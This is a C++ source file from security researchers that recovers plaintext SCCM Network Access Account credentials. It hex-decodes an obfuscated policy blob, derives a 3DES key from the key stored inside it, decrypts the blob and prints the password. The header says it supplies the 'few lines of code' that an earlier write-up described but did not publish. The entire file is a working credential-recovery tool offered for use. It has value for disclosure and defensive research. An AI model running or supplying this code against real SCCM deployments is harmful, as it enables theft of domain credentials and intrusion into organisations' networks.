/*
* Research by Evan McBroom and Chris Thompson (@_Mayyhem)
* Roger Zander made security recommendations for SCCM based on the claim that NAA credentials could be recovered.
* Source: https://rzander.azurewebsites.net/network-access-accounts-are-evil/
* Roger stated that recover was "possible with a few lines of code" but did not provide any code. Here is working code.
*/

#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "Crypt32.lib")

namespace {
    struct THeaderInfo {
        DWORD nHeaderLength; // Must be 0x14
        DWORD nEncryptedSize;
        DWORD nPlainSize;
        DWORD nAlgorithm;
        DWORD nFlag;
    };

    struct GarbledData {
        DWORD dwVersion;
        BYTE  key[40];
        THeaderInfo header;
        BYTE  pData[];
    };

    HRESULT HexDecode(LPCWSTR pwszGarbled, LPBYTE* pbGarbled, LPDWORD nGarbledSize) {
        if (CryptStringToBinaryW(pwszGarbled, 0, CRYPT_STRING_HEX, nullptr, nGarbledSize, nullptr, nullptr)) {
            if ((*pbGarbled = reinterpret_cast<LPBYTE>(LocalAlloc(LMEM_ZEROINIT, *nGarbledSize))) != nullptr) {
                if (CryptStringToBinaryW(pwszGarbled, 0, CRYPT_STRING_HEX, *pbGarbled, nGarbledSize, nullptr, nullptr)) {
                    return NO_ERROR;
                }
            }
        }
        return GetLastError();
    }
}

namespace DES {
    HRESULT DecryptBuffer(LPBYTE pbKey, DWORD nKeySize, THeaderInfo* pHeader, DWORD nEncryptedSize, LPBYTE* pbPlain, LPDWORD nPlainSize) {
        HRESULT succeeded{ false };
        HCRYPTPROV hProv;
        if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            HCRYPTHASH hHash;
            if (CryptCreateHash(hProv, CALG_SHA, 0, 0, &hHash)) {
                if (CryptHashData(hHash, pbKey, nKeySize, 0)) {
                    HCRYPTKEY hKey;
                    // In our testing pHeader->nAlgorithm was CALG_3DES (e.g. 0x6603)
                    if (CryptDeriveKey(hProv, pHeader->nAlgorithm, hHash, pHeader->nFlag, &hKey)) {
                        LPBYTE pData{ reinterpret_cast<LPBYTE>(pHeader) + pHeader->nHeaderLength };
                        DWORD dwDecryptedLen{ pHeader->nPlainSize };
                        if (CryptDecrypt(hKey, 0, TRUE, 0, pData, &dwDecryptedLen)) {
                            *nPlainSize = dwDecryptedLen;
                            *pbPlain = reinterpret_cast<LPBYTE>(LocalAlloc(LMEM_ZEROINIT, dwDecryptedLen));
                            memcpy(*pbPlain, pData, dwDecryptedLen);
                            ZeroMemory(pData, dwDecryptedLen);
                            succeeded = true;
                        }
                        CryptDestroyHash(hKey);
                    }
                }
                CryptDestroyHash(hHash);
            }
            CryptReleaseContext(hProv, 0);
        }
        return (succeeded) ? NO_ERROR : GetLastError();
    }
}

namespace Obfuscation {
    HRESULT UnobfuscateBuffer(GarbledData* pbGarbled, DWORD nGarbledSize, LPBYTE* pbPlain, LPDWORD nPlainSize) {
        if (pbGarbled->dwVersion == 0x1389 /* 5001 */) {
            return DES::DecryptBuffer(pbGarbled->key, sizeof(GarbledData::key), &pbGarbled->header, nGarbledSize - sizeof(GarbledData::dwVersion) - sizeof(GarbledData::key), pbPlain, nPlainSize);
        }
        else {
            return E_FAIL;
        }
    }
}

int wmain(int argc, wchar_t** argv) {
    if (argc == 2) {
        // The following implements SMS::Crypto::Obfuscation::UnobfuscateWCharBuffer
        LPBYTE pbGarbled;
        DWORD nGarbledSize;
        if (HexDecode(argv[1], &pbGarbled, &nGarbledSize) == NO_ERROR) {
            LPBYTE pbPlain;
            DWORD nPlainSize;
            if (Obfuscation::UnobfuscateBuffer(reinterpret_cast<GarbledData*>(pbGarbled), nGarbledSize, &pbPlain, &nPlainSize) == NO_ERROR) {
                printf("Plaintext: %ws\n", pbPlain);
                LocalFree(pbPlain);
            }
            else {
                LPWSTR messageBuffer = nullptr;
                size_t size = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, nullptr, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), reinterpret_cast<LPWSTR>(&messageBuffer), 0, nullptr);
                printf("Error: %ws\n", messageBuffer);
                LocalFree(messageBuffer);
            }
            LocalFree(pbGarbled);
        }
    }
    else {
        printf("%ws <hex ciphertext>\n", argv[0]);
    }
}
